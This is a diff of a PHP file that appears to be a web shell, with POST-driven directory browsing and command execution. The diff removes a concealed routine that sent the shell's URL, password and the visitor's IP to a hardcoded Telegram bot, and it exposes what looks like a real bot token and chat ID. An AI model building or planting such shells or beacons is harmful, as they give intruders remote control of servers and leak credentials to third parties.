@@ -22,14 +22,6 @@ $currentDir =
     isset($_POST["targetDir"]) && is_dir($_POST["targetDir"])
         ? realpath($_POST["targetDir"])
         : $defaultDir;
-$botToken = "7983898656:AAGd7-xPkQnLcawefshhp2cG1KX_PMSvaYs";
-$chatId = "8478623770";
-$xPath = "http://" . $_SERVER["SERVER_NAME"] . $_SERVER["REQUEST_URI"];
-$logMessage =
-    "___kontolbengkak___ \n\n Shell nya =\n $xPath \n\n Password =\n $pass \n\n IP Hacker  :\n [ " .
-    $_SERVER["REMOTE_ADDR"] .
-    " ]";
-sendTelegramMessage($botToken, $chatId, $logMessage);
 // Fungsi tampil file/folder
 function listFiles($dir)
 {
@@ -197,23 +189,7 @@ if (isset($_POST["command"])) {
         htmlspecialchars($output) .
         "</pre></div>";
 }
-function sendTelegramMessage($botToken, $chatId, $message)
-{
-    $url = "https://api.telegram.org/bot{$botToken}/sendMessage";
-    $params = [
-        "chat_id" => $chatId,
-        "text" => $message,
-    ];
-    $options = [
-        "http" => [
-            "method" => "POST",
-            "header" => "Content-Type: application/x-www-form-urlencoded",
-            "content" => http_build_query($params),
-        ],
-    ];
-    $context = stream_context_create($options);
-    $response = file_get_contents($url, false, $context);
-}
+
 ?>
 <!DOCTYPE html>
 <html>
